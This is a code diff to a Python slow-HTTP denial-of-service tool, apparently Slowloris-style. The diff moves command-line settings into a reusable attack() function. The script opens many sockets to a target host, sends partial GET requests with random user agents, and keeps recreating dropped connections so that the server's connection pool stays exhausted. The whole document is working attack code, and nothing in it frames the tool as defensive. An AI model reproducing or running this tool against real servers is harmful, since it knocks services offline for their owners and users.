@@ -2,33 +2,25 @@ import logging
 import random
 import socket
 import time
+import ssl
 from args_parser import get_args
 from my_socket import MySocket
 from user_agents import user_agents
 
 
-args = get_args()
-
-if args.https:
-    logging.info("Importing ssl module")
-    import ssl
-
-list_of_sockets = []
-
-
-def init_socket(ip):
+def init_socket(ip, port, https, randuseragent):
     s = MySocket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
 
-    if args.https:
+    if https:
         s = ssl.wrap_socket(s)
 
-    s.connect((ip, args.port))
+    s.connect((ip, port))
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
     ua = user_agents[0]
-    if args.randuseragent:
+    if randuseragent:
         ua = random.choice(user_agents)
 
     s.send_header("User-Agent", ua)
@@ -36,16 +28,17 @@ def init_socket(ip):
     return s
 
 
-def main():
-    ip = args.host
-    socket_count = args.sockets
+def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
+    list_of_sockets = []
+    ip = host
+    socket_count = sockets
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
     logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
+            s = init_socket(ip, port, https, randuseragent)
         except socket.error as e:
             logging.debug(e)
             break
@@ -66,14 +59,14 @@ def main():
             logging.debug("Recreating socket...")
             for _ in range(socket_count - len(list_of_sockets)):
                 try:
-                    s = init_socket(ip)
+                    s = init_socket(ip, port, https, randuseragent)
                     if s:
                         list_of_sockets.append(s)
                 except socket.error as e:
                     logging.debug(e)
                     break
-            logging.debug("Sleeping for %d seconds", args.sleeptime)
-            time.sleep(args.sleeptime)
+            logging.debug("Sleeping for %d seconds", sleeptime)
+            time.sleep(sleeptime)
 
         except (KeyboardInterrupt, SystemExit):
             logging.info("Stopping Slow HTTP Attacker")
@@ -81,4 +74,5 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    args = get_args()
+    attack(args.mode, args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
